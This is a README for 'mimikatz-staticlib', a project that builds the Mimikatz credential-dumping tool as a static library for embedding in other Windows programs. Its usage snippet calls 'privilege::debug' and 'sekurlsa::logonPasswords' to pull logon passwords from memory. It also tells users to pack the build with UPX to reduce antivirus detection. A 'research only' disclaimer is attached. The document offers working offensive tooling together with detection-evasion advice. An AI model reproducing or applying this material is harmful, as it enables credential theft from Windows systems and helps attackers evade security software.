# mimikatz-staticlib

Mimikatz built as a static library.

## Build

This project is configured for Visual Studio 2017 and may not build with other versions. 

Supported target systems: Windows Vista/7/8/10, Windows Server 2008/2012/2016, 32-bit and 64-bit.

Unlike original `mimikatz`, it does not include `mimilib` and `mimidrv`. Also, `minesweeper`, `busylights` and some other rarely used modules are disabled.

Important: set *"Linker/General/Use Library Dependency Input"* to *"Yes"*, otherwise globals like `mimikatz_modules` may remain uninitialized and the program will crash.  Source: https://ofekshilon.com/2013/04/06/forcing-construction-of-global-objects-in-static-libraries/

## Usage

```cpp
#include "mimikatz-staticlib/mimikatz/mimikatz-staticlib.h"

mimikatz_begin();
std::wcout << mimkatz_exec(L"privilege::debug") << L"\n";
std::wcout << mimkatz_exec(L"sekurlsa::logonPasswords") << L"\n";
std::wcout << mimkatz_exec(L"coffee") << L"\n";
mimikatz_end();
```

Do a 64-bit build and pack it with UPX to reduce detection by antivirus software.

Refer to original [@gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz) repository and its [Wiki](https://github.com/gentilkiwi/mimikatz/wiki) for more information.

This project is research only, please do not use for illegal purposes.

## Credits

Mimikatz (c) Benjamin DELPY `gentilkiwi` (benjamin@gentilkiwi.com) / Vincent LE TOUX (vincent.letoux@gmail.com)
http://blog.gentilkiwi.com/mimikatz

CC BY 4.0 licence - https://creativecommons.org/licenses/by/4.0/
